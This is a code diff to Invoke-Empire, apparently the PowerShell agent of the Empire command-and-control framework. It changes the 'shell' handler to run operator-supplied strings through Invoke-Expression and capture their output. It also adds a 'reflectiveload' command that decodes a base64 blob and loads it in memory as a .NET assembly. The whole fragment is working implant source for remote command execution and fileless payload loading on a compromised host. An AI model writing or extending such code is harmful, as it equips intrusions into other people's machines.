@@ -274,8 +274,27 @@ function Invoke-Empire {
         if ($cmd.ToLower() -eq 'shell') {
             # if we have a straight 'shell' command, skip the aliases
             if ($cmdargs.length -eq '') { $output = 'no shell command supplied' }
-            else { $output = IEX "$cmdargs" }
+            else {
+                $OldConsoleOut = [Console]::Out
+                $StringWriter = New-Object IO.StringWriter
+                [Console]::SetOut($StringWriter)
+                $output = iex "$cmdargs" | out-string
+                #for somereason this was quoted again and it shouldn't need to be
+                #$output = iex $cmdargs
+                [Console]::SetOut($OldConsoleOut)
+
+                if ($output.length -eq 0){
+                    $output = $StringWriter.ToString()
+                    }
+            }
             $output += "`n`r..Command execution completed."
+        }
+        elseif ($cmd.ToLower() -eq 'reflectiveload'){
+            if ($cmdargs.length -eq '') { $output = 'no binary supplied' }
+            else{
+                $assembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($cmdargs))
+                $output = "`n`r Reflective Load Complete"
+            }
         }
         else {
             switch -regex ($cmd) {
